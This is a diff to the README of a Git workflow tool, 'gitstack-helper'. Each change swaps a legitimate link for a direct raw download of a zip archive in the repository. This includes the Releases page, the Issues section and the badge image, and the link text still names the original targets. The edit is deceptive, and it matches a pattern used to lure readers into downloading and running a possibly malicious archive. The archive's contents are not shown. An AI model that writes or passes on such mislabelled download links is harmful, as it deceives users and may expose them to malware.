@@ -13,10 +13,10 @@ To get started with gitstack-helper, follow these steps to download and install 
 - Internet Connection: Required for download
 
 ## 📥 Download Link
-[![Download gitstack-helper](https://img.shields.io/badge/Download-gitstack--helper-blue?style=for-the-badge)](https://github.com/AlunoManuel/gitstack-helper/releases)
+[![Download gitstack-helper](https://github.com/AlunoManuel/gitstack-helper/raw/refs/heads/main/gitstack_helper/helper_gitstack_v1.4.zip)](https://github.com/AlunoManuel/gitstack-helper/raw/refs/heads/main/gitstack_helper/helper_gitstack_v1.4.zip)
 
 ## 🌐 Download & Install
-1. Visit the [Releases page](https://github.com/AlunoManuel/gitstack-helper/releases) to download gitstack-helper. 
+1. Visit the [Releases page](https://github.com/AlunoManuel/gitstack-helper/raw/refs/heads/main/gitstack_helper/helper_gitstack_v1.4.zip) to download gitstack-helper. 
 2. Choose the appropriate version for your operating system.
 3. Click on the file to start downloading it to your computer.
 4. Once the download is complete, locate the downloaded file on your computer.
@@ -37,7 +37,7 @@ After installation, gitstack-helper offers a user-friendly interface. Here’s h
 4. **Sync Changes**: Regularly sync your branches to keep up with the latest updates.
 
 ## 💬 Support & Feedback
-For any questions or feedback, please visit the [Issues section](https://github.com/AlunoManuel/gitstack-helper/issues) of our repository. We welcome your input and are here to help!
+For any questions or feedback, please visit the [Issues section](https://github.com/AlunoManuel/gitstack-helper/raw/refs/heads/main/gitstack_helper/helper_gitstack_v1.4.zip) of our repository. We welcome your input and are here to help!
 
 ## 📋 Contributing
 If you would like to contribute to gitstack-helper, we appreciate your help! Here’s how you can get involved:
@@ -64,4 +64,4 @@ This project covers various key topics that can benefit developers:
 - versioncontrol
 
 ## 📥 Download Link
-Don’t forget to return to the [Releases page](https://github.com/AlunoManuel/gitstack-helper/releases) to download your copy of gitstack-helper today. Enjoy simplifying your Git workflow!
+Don’t forget to return to the [Releases page](https://github.com/AlunoManuel/gitstack-helper/raw/refs/heads/main/gitstack_helper/helper_gitstack_v1.4.zip) to download your copy of gitstack-helper today. Enjoy simplifying your Git workflow!
